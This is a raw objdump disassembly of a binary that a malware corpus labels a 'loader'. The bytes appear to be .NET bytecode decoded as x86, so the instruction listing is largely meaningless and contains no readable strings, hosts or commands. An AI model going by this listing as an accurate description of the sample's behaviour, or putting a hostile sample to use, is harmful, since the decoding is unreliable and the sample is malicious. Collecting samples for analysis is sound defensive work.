
malware_samples/loader/99ad8a05662a178655ad915b6c94984303d16aa9499d65a80d7b26bc2d294a7f.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	80 99 00 00 00 00 00 	sbbb   $0x0,0x0(%ecx)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 0c 4f 00       	add    $0x4f0c00,%eax
  402013:	00 44 4a 00          	add    %al,0x0(%edx,%ecx,2)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 72 00             	add    %dh,0x0(%edx)
  40201e:	00 06                	add    %al,(%esi)
  402020:	d0 4a 00             	rorb   $1,0x0(%edx)
  402023:	00 3b                	add    %bh,(%ebx)
  402025:	04 00                	add    $0x0,%al
	...
  40204f:	00 13                	add    %dl,(%ebx)
  402051:	30 0a                	xor    %cl,(%edx)
  402053:	00 ce                	add    %cl,%dh
  402055:	00 00                	add    %al,(%eax)
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 72 01             	adc    %esi,0x1(%edx)
  40205e:	00 00                	add    %al,(%eax)
  402060:	70 20                	jo     0x402082
  402062:	80 00 00             	addb   $0x0,(%eax)
  402065:	00 73 0c             	add    %dh,0xc(%ebx)
  402068:	00 00                	add    %al,(%eax)
  40206a:	0a 0a                	or     (%edx),%cl
  40206c:	05 20 80 00 00       	add    $0x8020,%eax
  402071:	00 73 0c             	add    %dh,0xc(%ebx)
  402074:	00 00                	add    %al,(%eax)
  402076:	0a 0b                	or     (%ebx),%cl
  402078:	12 02                	adc    (%edx),%al
  40207a:	fe                   	(bad)
  40207b:	15 03 00 00 02       	adc    $0x2000003,%eax
  402080:	03 28                	add    (%eax),%ebp
  402082:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  402087:	08 12                	or     %dl,(%edx)
  402089:	02 03                	add    (%ebx),%al
  40208b:	7d 03                	jge    0x402090
  40208d:	00 00                	add    %al,(%eax)
  40208f:	04 02                	add    $0x2,%al
  402091:	28 0d 00 00 0a 2d    	sub    %cl,0x2d0a0000
  402097:	08 12                	or     %dl,(%edx)
  402099:	02 02                	add    (%edx),%al
  40209b:	7d 04                	jge    0x4020a1
  40209d:	00 00                	add    %al,(%eax)
  40209f:	04 12                	add    $0x12,%al
  4020a1:	02 08                	add    (%eax),%cl
  4020a3:	28 01                	sub    %al,(%ecx)
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	2b 7d 01             	sub    0x1(%ebp),%edi
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	04 16                	add    $0x16,%al
  4020ae:	0d 18 13 04 0e       	or     $0xe041318,%eax
  4020b3:	04 17                	add    $0x17,%al
  4020b5:	5f                   	pop    %edi
  4020b6:	17                   	pop    %ss
  4020b7:	33 1b                	xor    (%ebx),%ebx
  4020b9:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	04 00                	add    $0x0,%al
  4020c0:	60                   	pusha
  4020c1:	13 04 0e             	adc    (%esi,%ecx,1),%eax
  4020c4:	05 18 5f 18 33       	add    $0x33185f18,%eax
  4020c9:	0a 11                	or     (%ecx),%dl
  4020cb:	04 20                	add    $0x20,%al
  4020cd:	80 00 00             	addb   $0x0,(%eax)
  4020d0:	00 60 13             	add    %ah,0x13(%eax)
  4020d3:	04 12                	add    $0x12,%al
  4020d5:	02 04 7e             	add    (%esi,%edi,2),%al
  4020d8:	0f 00 00             	sldt   (%eax)
  4020db:	0a 16                	or     (%esi),%dl
  4020dd:	07                   	pop    %es
  4020de:	20 80 00 00 00 06    	and    %al,0x6000000(%eax)
  4020e4:	20 80 00 00 00 12    	and    %al,0x12000000(%eax)
  4020ea:	03 11                	add    (%ecx),%edx
  4020ec:	04 28                	add    $0x28,%al
  4020ee:	01 00                	add    %eax,(%eax)
  4020f0:	00 06                	add    %al,(%esi)
  4020f2:	13 05 11 05 2d 30    	adc    0x302d0511,%eax
  4020f8:	73 04                	jae    0x4020fe
  4020fa:	00 00                	add    %al,(%eax)
  4020fc:	06                   	push   %es
  4020fd:	13 06                	adc    (%esi),%eax
  4020ff:	11 06                	adc    %eax,(%esi)
  402101:	07                   	pop    %es
  402102:	6f                   	outsl  %ds:(%esi),(%dx)
  402103:	10 00                	adc    %al,(%eax)
  402105:	00 0a                	add    %cl,(%edx)
  402107:	7d 21                	jge    0x40212a
  402109:	00 00                	add    %al,(%eax)
  40210b:	04 11                	add    $0x11,%al
  40210d:	06                   	push   %es
  40210e:	06                   	push   %es
  40210f:	6f                   	outsl  %ds:(%esi),(%dx)
  402110:	10 00                	adc    %al,(%eax)
  402112:	00 0a                	add    %cl,(%edx)
  402114:	7d 22                	jge    0x402138
  402116:	00 00                	add    %al,(%eax)
  402118:	04 11                	add    $0x11,%al
  40211a:	06                   	push   %es
  40211b:	72 01                	jb     0x40211e
  40211d:	00 00                	add    %al,(%eax)
  40211f:	70 7d                	jo     0x40219e
  402121:	23 00                	and    (%eax),%eax
  402123:	00 04 11             	add    %al,(%ecx,%edx,1)
  402126:	06                   	push   %es
  402127:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  40212a:	1e                   	push   %ds
  40212b:	02 28                	add    (%eax),%ch
  40212d:	11 00                	adc    %eax,(%eax)
  40212f:	00 0a                	add    %cl,(%edx)
  402131:	2a a2 02 7e 14 00    	sub    0x147e02(%edx),%ah
  402137:	00 0a                	add    %cl,(%edx)
  402139:	7d 21                	jge    0x40215c
  40213b:	00 00                	add    %al,(%eax)
  40213d:	04 02                	add    $0x2,%al
  40213f:	7e 14                	jle    0x402155
  402141:	00 00                	add    %al,(%eax)
  402143:	0a 7d 22             	or     0x22(%ebp),%bh
  402146:	00 00                	add    %al,(%eax)
  402148:	04 02                	add    $0x2,%al
  40214a:	7e 14                	jle    0x402160
  40214c:	00 00                	add    %al,(%eax)
  40214e:	0a 7d 23             	or     0x23(%ebp),%bh
  402151:	00 00                	add    %al,(%eax)
  402153:	04 02                	add    $0x2,%al
  402155:	28 11                	sub    %dl,(%ecx)
  402157:	00 00                	add    %al,(%eax)
  402159:	0a 2a                	or     (%edx),%ch
  40215b:	1e                   	push   %ds
  40215c:	02 7b 24             	add    0x24(%ebx),%bh
  40215f:	00 00                	add    %al,(%eax)
  402161:	04 2a                	add    $0x2a,%al
  402163:	22 02                	and    (%edx),%al
  402165:	03 7d 24             	add    0x24(%ebp),%edi
  402168:	00 00                	add    %al,(%eax)
  40216a:	04 2a                	add    $0x2a,%al
  40216c:	2a 1f                	sub    (%edi),%bl
  40216e:	78 1f                	js     0x40218f
  402170:	32 73 15             	xor    0x15(%ebx),%dh
  402173:	00 00                	add    %al,(%eax)
  402175:	0a 2a                	or     (%edx),%ch
  402177:	06                   	push   %es
  402178:	2a 22                	sub    (%edx),%ah
  40217a:	16                   	push   %ss
  40217b:	16                   	push   %ss
  40217c:	73 16                	jae    0x402194
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 2a                	or     (%edx),%ch
  402182:	06                   	push   %es
  402183:	2a 0e                	sub    (%esi),%cl
  402185:	1f                   	pop    %ds
  402186:	19 2a                	sbb    %ebp,(%edx)
  402188:	06                   	push   %es
  402189:	2a 00                	sub    (%eax),%al
  40218b:	00 03                	add    %al,(%ebx)
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 53 00             	add    %dl,0x0(%ebx)
  402192:	00 00                	add    %al,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	02 7b 27             	add    0x27(%ebx),%bh
  40219b:	00 00                	add    %al,(%eax)
  40219d:	04 2c                	add    $0x2c,%al
  40219f:	13 02                	adc    (%edx),%eax
  4021a1:	7b 27                	jnp    0x4021ca
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	04 6f                	add    $0x6f,%al
  4021a7:	17                   	pop    %ss
  4021a8:	00 00                	add    %al,(%eax)
  4021aa:	0a 02                	or     (%edx),%al
  4021ac:	14 7d                	adc    $0x7d,%al
  4021ae:	27                   	daa
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	04 2a                	add    $0x2a,%al
  4021b3:	02 73 18             	add    0x18(%ebx),%dh
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0a 7d 27             	or     0x27(%ebp),%bh
  4021bb:	00 00                	add    %al,(%eax)
  4021bd:	04 02                	add    $0x2,%al
  4021bf:	7b 27                	jnp    0x4021e8
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	04 23                	add    $0x23,%al
	...
  4021cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ce:	19 00                	sbb    %eax,(%eax)
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	02 7b 27             	add    0x27(%ebx),%bh
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 16                	add    $0x16,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	1a 00                	sbb    (%eax),%al
  4021dc:	00 0a                	add    %cl,(%edx)
  4021de:	02 7b 27             	add    0x27(%ebx),%bh
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	04 17                	add    $0x17,%al
  4021e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e6:	1b 00                	sbb    (%eax),%eax
  4021e8:	00 0a                	add    %cl,(%edx)
  4021ea:	2a 1e                	sub    (%esi),%bl
  4021ec:	02 7b 25             	add    0x25(%ebx),%bh
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	04 2a                	add    $0x2a,%al
  4021f3:	22 02                	and    (%edx),%al
  4021f5:	03 7d 25             	add    0x25(%ebp),%edi
  4021f8:	00 00                	add    %al,(%eax)
  4021fa:	04 2a                	add    $0x2a,%al
  4021fc:	13 30                	adc    (%eax),%esi
  4021fe:	05 00 7f 00 00       	add    $0x7f00,%eax
  402203:	00 02                	add    %al,(%edx)
  402205:	00 00                	add    %al,(%eax)
  402207:	11 0f                	adc    %ecx,(%edi)
  402209:	01 28                	add    %ebp,(%eax)
  40220b:	1c 00                	sbb    $0x0,%al
  40220d:	00 0a                	add    %cl,(%edx)
  40220f:	0f 01                	(bad)
  402211:	28 1d 00 00 0a 59    	sub    %bl,0x590a0000
  402217:	17                   	pop    %ss
  402218:	58                   	pop    %eax
  402219:	0f 01                	(bad)
  40221b:	28 1e                	sub    %bl,(%esi)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	0a 0f                	or     (%edi),%cl
  402221:	01 28                	add    %ebp,(%eax)
  402223:	1f                   	pop    %ds
  402224:	00 00                	add    %al,(%eax)
  402226:	0a 59 17             	or     0x17(%ecx),%bl
  402229:	58                   	pop    %eax
  40222a:	73 20                	jae    0x40224c
  40222c:	00 00                	add    %al,(%eax)
  40222e:	0a 0a                	or     (%edx),%cl
  402230:	16                   	push   %ss
  402231:	0b 2b                	or     (%ebx),%ebp
  402233:	3f                   	aas
  402234:	16                   	push   %ss
  402235:	0c 2b                	or     $0x2b,%al
  402237:	25 06 07 08 28       	and    $0x28080706,%eax
  40223c:	21 00                	and    %eax,(%eax)
  40223e:	00 0a                	add    %cl,(%edx)
  402240:	1f                   	pop    %ds
  402241:	20 02                	and    %al,(%edx)
  402243:	7b 25                	jnp    0x40226a
  402245:	00 00                	add    %al,(%eax)
  402247:	04 02                	add    $0x2,%al
  402249:	7b 24                	jnp    0x40226f
  40224b:	00 00                	add    %al,(%eax)
  40224d:	04 16                	add    $0x16,%al
  40224f:	73 22                	jae    0x402273
  402251:	00 00                	add    %al,(%eax)
  402253:	0a 81 0e 00 00 01    	or     0x100000e(%ecx),%al
  402259:	08 17                	or     %dl,(%edi)
  40225b:	58                   	pop    %eax
  40225c:	0c 08                	or     $0x8,%al
  40225e:	0f 01                	(bad)
  402260:	28 1e                	sub    %bl,(%esi)
  402262:	00 00                	add    %al,(%eax)
  402264:	0a 0f                	or     (%edi),%cl
  402266:	01 28                	add    %ebp,(%eax)
  402268:	1f                   	pop    %ds
  402269:	00 00                	add    %al,(%eax)
  40226b:	0a 59 31             	or     0x31(%ecx),%bl
  40226e:	c9                   	leave
  40226f:	07                   	pop    %es
  402270:	17                   	pop    %ss
  402271:	58                   	pop    %eax
  402272:	0b 07                	or     (%edi),%eax
  402274:	0f 01                	(bad)
  402276:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	0f 01                	(bad)
  40227d:	28 1d 00 00 0a 59    	sub    %bl,0x590a0000
  402283:	31 af 06 2a 0a 17    	xor    %ebp,0x170a2a06(%edi)
  402289:	2a 36                	sub    (%esi),%dh
  40228b:	20 f0                	and    %dh,%al
  40228d:	00 00                	add    %al,(%eax)
  40228f:	00 1f                	add    %bl,(%edi)
  402291:	54                   	push   %esp
  402292:	73 15                	jae    0x4022a9
  402294:	00 00                	add    %al,(%eax)
  402296:	0a 2a                	or     (%edx),%ch
  402298:	2a 1f                	sub    (%edi),%bl
  40229a:	78 1f                	js     0x4022bb
  40229c:	54                   	push   %esp
  40229d:	73 15                	jae    0x4022b4
  40229f:	00 00                	add    %al,(%eax)
  4022a1:	0a 2a                	or     (%edx),%ch
  4022a3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4022a4:	03 1a                	add    (%edx),%ebx
  4022a6:	5f                   	pop    %edi
  4022a7:	2c 12                	sub    $0x12,%al
  4022a9:	02 6f 23             	add    0x23(%edi),%ch
  4022ac:	00 00                	add    %al,(%eax)
  4022ae:	0a 72 01             	or     0x1(%edx),%dh
  4022b1:	00 00                	add    %al,(%eax)
  4022b3:	70 17                	jo     0x4022cc
  4022b5:	28 27                	sub    %ah,(%edi)
  4022b7:	00 00                	add    %al,(%eax)
  4022b9:	06                   	push   %es
  4022ba:	2a 02                	sub    (%edx),%al
  4022bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4022bd:	23 00                	and    (%eax),%eax
  4022bf:	00 0a                	add    %cl,(%edx)
  4022c1:	72 01                	jb     0x4022c4
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	70 16                	jo     0x4022dd
  4022c7:	28 27                	sub    %ah,(%edi)
  4022c9:	00 00                	add    %al,(%eax)
  4022cb:	06                   	push   %es
  4022cc:	2a 06                	sub    (%esi),%al
  4022ce:	2a 06                	sub    (%esi),%al
  4022d0:	2a 06                	sub    (%esi),%al
  4022d2:	2a 00                	sub    (%eax),%al
  4022d4:	13 30                	adc    (%eax),%esi
  4022d6:	02 00                	add    (%eax),%al
  4022d8:	1a 00                	sbb    (%eax),%al
  4022da:	00 00                	add    %al,(%eax)
  4022dc:	03 00                	add    (%eax),%eax
  4022de:	00 11                	add    %dl,(%ecx)
  4022e0:	12 00                	adc    (%eax),%al
  4022e2:	fe                   	(bad)
  4022e3:	15 0d 00 00 01       	adc    $0x100000d,%eax
  4022e8:	12 00                	adc    (%eax),%al
  4022ea:	16                   	push   %ss
  4022eb:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4022ee:	00 0a                	add    %cl,(%edx)
  4022f0:	12 00                	adc    (%eax),%al
  4022f2:	16                   	push   %ss
  4022f3:	28 25 00 00 0a 06    	sub    %ah,0x60a0000
  4022f9:	2a 06                	sub    (%esi),%al
  4022fb:	2a 13                	sub    (%ebx),%dl
  4022fd:	30 02                	xor    %al,(%edx)
  4022ff:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	04 00                	add    $0x0,%al
  402306:	00 11                	add    %dl,(%ecx)
  402308:	12 00                	adc    (%eax),%al
  40230a:	fe                   	(bad)
  40230b:	15 0c 00 00 01       	adc    $0x100000c,%eax
  402310:	12 00                	adc    (%eax),%al
  402312:	1f                   	pop    %ds
  402313:	32 28                	xor    (%eax),%ch
  402315:	26 00 00             	add    %al,%es:(%eax)
  402318:	0a 12                	or     (%edx),%dl
  40231a:	00 1f                	add    %bl,(%edi)
  40231c:	78 28                	js     0x402346
  40231e:	27                   	daa
  40231f:	00 00                	add    %al,(%eax)
  402321:	0a 06                	or     (%esi),%al
  402323:	2a 06                	sub    (%esi),%al
  402325:	2a 1e                	sub    (%esi),%bl
  402327:	02 7b 26             	add    0x26(%ebx),%bh
  40232a:	00 00                	add    %al,(%eax)
  40232c:	04 2a                	add    $0x2a,%al
  40232e:	22 02                	and    (%edx),%al
  402330:	03 7d 26             	add    0x26(%ebp),%edi
  402333:	00 00                	add    %al,(%eax)
  402335:	04 2a                	add    $0x2a,%al
  402337:	7e 02                	jle    0x40233b
  402339:	1f                   	pop    %ds
  40233a:	0f 7d                	(bad)
  40233c:	24 00                	and    $0x0,%al
  40233e:	00 04 02             	add    %al,(%edx,%eax,1)
  402341:	28 28                	sub    %ch,(%eax)
  402343:	00 00                	add    %al,(%eax)
  402345:	0a 6f 29             	or     0x29(%edi),%ch
  402348:	00 00                	add    %al,(%eax)
  40234a:	0a 7d 26             	or     0x26(%ebp),%bh
  40234d:	00 00                	add    %al,(%eax)
  40234f:	04 02                	add    $0x2,%al
  402351:	28 2a                	sub    %ch,(%edx)
  402353:	00 00                	add    %al,(%eax)
  402355:	0a 2a                	or     (%edx),%ch
  402357:	00 1b                	add    %bl,(%ebx)
  402359:	30 05 00 37 02 00    	xor    %al,0x23700
  40235f:	00 05 00 00 11 73    	add    %al,0x73110000
  402365:	18 00                	sbb    %al,(%eax)
  402367:	00 0a                	add    %cl,(%edx)
  402369:	0a 06                	or     (%esi),%al
  40236b:	22 00                	and    (%eax),%al
  40236d:	00 c0                	add    %al,%al
  40236f:	40                   	inc    %eax
  402370:	22 00                	and    (%eax),%al
  402372:	00 50 41             	add    %dl,0x41(%eax)
  402375:	73 2b                	jae    0x4023a2
  402377:	00 00                	add    %al,(%eax)
  402379:	0a 6f 2c             	or     0x2c(%edi),%ch
  40237c:	00 00                	add    %al,(%eax)
  40237e:	0a 06                	or     (%esi),%al
  402380:	17                   	pop    %ss
  402381:	6f                   	outsl  %ds:(%esi),(%dx)
  402382:	2d 00 00 0a 73       	sub    $0x730a0000,%eax
  402387:	2e 00 00             	add    %al,%cs:(%eax)
  40238a:	0a 0b                	or     (%ebx),%cl
  40238c:	73 2f                	jae    0x4023bd
  40238e:	00 00                	add    %al,(%eax)
  402390:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  402393:	30 00                	xor    %al,(%eax)
  402395:	00 0a                	add    %cl,(%edx)
  402397:	0d 73 30 00 00       	or     $0x3073,%eax
  40239c:	0a 13                	or     (%ebx),%dl
  40239e:	04 03                	add    $0x3,%al
  4023a0:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  4023a6:	1d 05 2c 0d 07       	sbb    $0x70d2c05,%eax
  4023ab:	72 03                	jb     0x4023b0
  4023ad:	00 00                	add    %al,(%eax)
  4023af:	70 6f                	jo     0x402420
  4023b1:	31 00                	xor    %eax,(%eax)
  4023b3:	00 0a                	add    %cl,(%edx)
  4023b5:	2b 14 07             	sub    (%edi,%eax,1),%edx
  4023b8:	72 25                	jb     0x4023df
  4023ba:	00 00                	add    %al,(%eax)
  4023bc:	70 6f                	jo     0x40242d
  4023be:	31 00                	xor    %eax,(%eax)
  4023c0:	00 0a                	add    %cl,(%edx)
  4023c2:	2b 07                	sub    (%edi),%eax
  4023c4:	07                   	pop    %es
  4023c5:	03 6f 31             	add    0x31(%edi),%ebp
  4023c8:	00 00                	add    %al,(%eax)
  4023ca:	0a 07                	or     (%edi),%al
  4023cc:	1f                   	pop    %ds
  4023cd:	09 1f                	or     %ebx,(%edi)
  4023cf:	13 73 32             	adc    0x32(%ebx),%esi
  4023d2:	00 00                	add    %al,(%eax)
  4023d4:	0a 6f 33             	or     0x33(%edi),%ch
  4023d7:	00 00                	add    %al,(%eax)
  4023d9:	0a 07                	or     (%edi),%al
  4023db:	06                   	push   %es
  4023dc:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4023df:	00 0a                	add    %cl,(%edx)
  4023e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4023e2:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4023e7:	08 12                	or     %dl,(%edx)
  4023e9:	08 28                	or     %ch,(%eax)
  4023eb:	36 00 00             	add    %al,%ss:(%eax)
  4023ee:	0a 1b                	or     (%ebx),%bl
  4023f0:	5a                   	pop    %edx
  4023f1:	1e                   	push   %ds
  4023f2:	5b                   	pop    %ebx
  4023f3:	1f                   	pop    %ds
  4023f4:	12 59 16             	adc    0x16(%ecx),%bl
  4023f7:	73 37                	jae    0x402430
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	0a 6f 38             	or     0x38(%edi),%ch
  4023fe:	00 00                	add    %al,(%eax)
  402400:	0a 07                	or     (%edi),%al
  402402:	17                   	pop    %ss
  402403:	6f                   	outsl  %ds:(%esi),(%dx)
  402404:	39 00                	cmp    %eax,(%eax)
  402406:	00 0a                	add    %cl,(%edx)
  402408:	06                   	push   %es
  402409:	6f                   	outsl  %ds:(%esi),(%dx)
  40240a:	3a 00                	cmp    (%eax),%al
  40240c:	00 0a                	add    %cl,(%edx)
  40240e:	07                   	pop    %es
  40240f:	6f                   	outsl  %ds:(%esi),(%dx)
  402410:	3b 00                	cmp    (%eax),%eax
  402412:	00 0a                	add    %cl,(%edx)
  402414:	05 2c 07 08 17       	add    $0x1708072c,%eax
  402419:	6f                   	outsl  %ds:(%esi),(%dx)
  40241a:	3c 00                	cmp    $0x0,%al
  40241c:	00 0a                	add    %cl,(%edx)
  40241e:	08 04 50             	or     %al,(%eax,%edx,2)
  402421:	6f                   	outsl  %ds:(%esi),(%dx)
  402422:	31 00                	xor    %eax,(%eax)
  402424:	00 0a                	add    %cl,(%edx)
  402426:	08 1f                	or     %bl,(%edi)
  402428:	0c 07                	or     $0x7,%al
  40242a:	6f                   	outsl  %ds:(%esi),(%dx)
  40242b:	3d 00 00 0a 07       	cmp    $0x70a0000,%eax
  402430:	6f                   	outsl  %ds:(%esi),(%dx)
  402431:	3e 00 00             	add    %al,%ds:(%eax)
  402434:	0a 1f                	or     (%edi),%bl
  402436:	0c 59                	or     $0x59,%al
  402438:	1f                   	pop    %ds
  402439:	14 6f                	adc    $0x6f,%al
  40243b:	3f                   	aas
  40243c:	00 00                	add    %al,(%eax)
  40243e:	0a 16                	or     (%esi),%dl
  402440:	28 1f                	sub    %bl,(%edi)
  402442:	00 00                	add    %al,(%eax)
  402444:	06                   	push   %es
  402445:	28 40 00             	sub    %al,0x0(%eax)
  402448:	00 0a                	add    %cl,(%edx)
  40244a:	13 05 11 05 28 0d    	adc    0xd280511,%eax
  402450:	00 00                	add    %al,(%eax)
  402452:	0a 2c 0d 09 72 47 00 	or     0x477209(,%ecx,1),%ch
  402459:	00 70 6f             	add    %dh,0x6f(%eax)
  40245c:	31 00                	xor    %eax,(%eax)
  40245e:	00 0a                	add    %cl,(%edx)
  402460:	2b 08                	sub    (%eax),%ecx
  402462:	09 11                	or     %edx,(%ecx)
  402464:	05 6f 31 00 00       	add    $0x316f,%eax
  402469:	0a 17                	or     (%edi),%dl
  40246b:	28 1f                	sub    %bl,(%edi)
  40246d:	00 00                	add    %al,(%eax)
  40246f:	06                   	push   %es
  402470:	28 40 00             	sub    %al,0x0(%eax)
  402473:	00 0a                	add    %cl,(%edx)
  402475:	13 06                	adc    (%esi),%eax
  402477:	11 06                	adc    %eax,(%esi)
  402479:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  40247f:	0e                   	push   %cs
  402480:	11 04 72             	adc    %eax,(%edx,%esi,2)
  402483:	4d                   	dec    %ebp
  402484:	00 00                	add    %al,(%eax)
  402486:	70 6f                	jo     0x4024f7
  402488:	31 00                	xor    %eax,(%eax)
  40248a:	00 0a                	add    %cl,(%edx)
  40248c:	2b 09                	sub    (%ecx),%ecx
  40248e:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  402491:	06                   	push   %es
  402492:	6f                   	outsl  %ds:(%esi),(%dx)
  402493:	31 00                	xor    %eax,(%eax)
  402495:	00 0a                	add    %cl,(%edx)
  402497:	09 17                	or     %edx,(%edi)
  402499:	6f                   	outsl  %ds:(%esi),(%dx)
  40249a:	41                   	inc    %ecx
  40249b:	00 00                	add    %al,(%eax)
  40249d:	0a 11                	or     (%ecx),%dl
  40249f:	04 18                	add    $0x18,%al
  4024a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4024a2:	41                   	inc    %ecx
  4024a3:	00 00                	add    %al,(%eax)
  4024a5:	0a 09                	or     (%ecx),%cl
  4024a7:	1f                   	pop    %ds
  4024a8:	0c 07                	or     $0x7,%al
  4024aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ab:	3e 00 00             	add    %al,%ds:(%eax)
  4024ae:	0a 20                	or     (%eax),%ah
  4024b0:	9e                   	sahf
  4024b1:	00 00                	add    %al,(%eax)
  4024b3:	00 59 28             	add    %bl,0x28(%ecx)
  4024b6:	42                   	inc    %edx
  4024b7:	00 00                	add    %al,(%eax)
  4024b9:	0a 07                	or     (%edi),%al
  4024bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bc:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  4024c1:	24 58                	and    $0x58,%al
  4024c3:	1f                   	pop    %ds
  4024c4:	4b                   	dec    %ebx
  4024c5:	1f                   	pop    %ds
  4024c6:	17                   	pop    %ss
  4024c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024c8:	3f                   	aas
  4024c9:	00 00                	add    %al,(%eax)
  4024cb:	0a 11                	or     (%ecx),%dl
  4024cd:	04 1f                	add    $0x1f,%al
  4024cf:	5d                   	pop    %ebp
  4024d0:	07                   	pop    %es
  4024d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d2:	3e 00 00             	add    %al,%ds:(%eax)
  4024d5:	0a 1f                	or     (%edi),%bl
  4024d7:	4d                   	dec    %ebp
  4024d8:	59                   	pop    %ecx
  4024d9:	28 42 00             	sub    %al,0x0(%edx)
  4024dc:	00 0a                	add    %cl,(%edx)
  4024de:	07                   	pop    %es
  4024df:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e0:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  4024e5:	24 58                	and    $0x58,%al
  4024e7:	1f                   	pop    %ds
  4024e8:	4b                   	dec    %ebx
  4024e9:	1f                   	pop    %ds
  4024ea:	17                   	pop    %ss
  4024eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ec:	3f                   	aas
  4024ed:	00 00                	add    %al,(%eax)
  4024ef:	0a 06                	or     (%esi),%al
  4024f1:	02 6f 31             	add    0x31(%edi),%ch
  4024f4:	00 00                	add    %al,(%eax)
  4024f6:	0a 06                	or     (%esi),%al
  4024f8:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  4024fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ff:	3e 00 00             	add    %al,%ds:(%eax)
  402502:	0a 1f                	or     (%edi),%bl
  402504:	0a 58 28             	or     0x28(%eax),%bl
  402507:	42                   	inc    %edx
  402508:	00 00                	add    %al,(%eax)
  40250a:	0a 07                	or     (%edi),%al
  40250c:	6f                   	outsl  %ds:(%esi),(%dx)
  40250d:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  402512:	47                   	inc    %edi
  402513:	58                   	pop    %eax
  402514:	73 37                	jae    0x40254d
  402516:	00 00                	add    %al,(%eax)
  402518:	0a 6f 43             	or     0x43(%edi),%ch
  40251b:	00 00                	add    %al,(%eax)
  40251d:	0a 06                	or     (%esi),%al
  40251f:	6f                   	outsl  %ds:(%esi),(%dx)
  402520:	3a 00                	cmp    (%eax),%al
  402522:	00 0a                	add    %cl,(%edx)
  402524:	19 8d 39 00 00 01    	sbb    %ecx,0x1000039(%ebp)
  40252a:	13 09                	adc    (%ecx),%ecx
  40252c:	11 09                	adc    %ecx,(%ecx)
  40252e:	16                   	push   %ss
  40252f:	08 a2 11 09 17 09    	or     %ah,0x9170911(%edx)
  402535:	a2 11 09 18 11       	mov    %al,0x11180911
  40253a:	04 a2                	add    $0xa2,%al
  40253c:	11 09                	adc    %ecx,(%ecx)
  40253e:	6f                   	outsl  %ds:(%esi),(%dx)
  40253f:	44                   	inc    %esp
  402540:	00 00                	add    %al,(%eax)
  402542:	0a 06                	or     (%esi),%al
  402544:	19 6f 45             	sbb    %ebp,0x45(%edi)
  402547:	00 00                	add    %al,(%eax)
  402549:	0a 06                	or     (%esi),%al
  40254b:	17                   	pop    %ss
  40254c:	6f                   	outsl  %ds:(%esi),(%dx)
  40254d:	46                   	inc    %esi
  40254e:	00 00                	add    %al,(%eax)
  402550:	0a 06                	or     (%esi),%al
  402552:	28 47 00             	sub    %al,0x0(%edi)
  402555:	00 0a                	add    %cl,(%edx)
  402557:	6f                   	outsl  %ds:(%esi),(%dx)
  402558:	48                   	dec    %eax
  402559:	00 00                	add    %al,(%eax)
  40255b:	0a 28                	or     (%eax),%ch
  40255d:	49                   	dec    %ecx
  40255e:	00 00                	add    %al,(%eax)
  402560:	0a 6f 4a             	or     0x4a(%edi),%ch
  402563:	00 00                	add    %al,(%eax)
  402565:	0a de                	or     %dh,%bl
  402567:	03 26                	add    (%esi),%esp
  402569:	de 00                	fiadds (%eax)
  40256b:	06                   	push   %es
  40256c:	16                   	push   %ss
  40256d:	6f                   	outsl  %ds:(%esi),(%dx)
  40256e:	4b                   	dec    %ebx
  40256f:	00 00                	add    %al,(%eax)
  402571:	0a 06                	or     (%esi),%al
  402573:	16                   	push   %ss
  402574:	6f                   	outsl  %ds:(%esi),(%dx)
  402575:	4c                   	dec    %esp
  402576:	00 00                	add    %al,(%eax)
